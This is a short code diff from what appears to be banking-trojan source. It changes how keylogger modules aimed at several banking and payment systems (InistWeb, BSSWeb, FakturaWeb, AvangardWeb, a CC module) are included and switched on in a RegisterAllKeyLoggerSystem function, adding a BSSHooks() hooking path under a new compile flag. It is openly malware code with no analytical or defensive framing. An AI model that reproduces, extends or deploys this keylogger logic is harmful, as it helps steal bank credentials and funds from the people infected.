@@ -10,11 +10,11 @@
 #include "Modules.h"
 
 #include "InistWeb.cpp"
-#include "BSSWeb.cpp"
 #include "FakturaWeb.cpp"
 #include "AvangardWeb.cpp"
 
-//#include "cc.cpp"
+#include "BSSWeb.cpp"
+
 
 //#include "BotDebug.h"
 
@@ -262,9 +262,12 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		InistWeb::Init();
 	#endif
 
-	#ifdef BSSWebModule
+	#ifdef BSSH
+    	BSSHooks();
+	#else
 		BSSWeb::Init();
 	#endif
+
 
 	// Добавляем систему фактура
 	#ifdef FakturaWebModule
@@ -279,7 +282,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		YandexSearchJpg::Init();
 	#endif
 
-	#ifdef CCModule
+	#ifdef CCH
 		CC::Init(hashApp);
 	#endif
 }
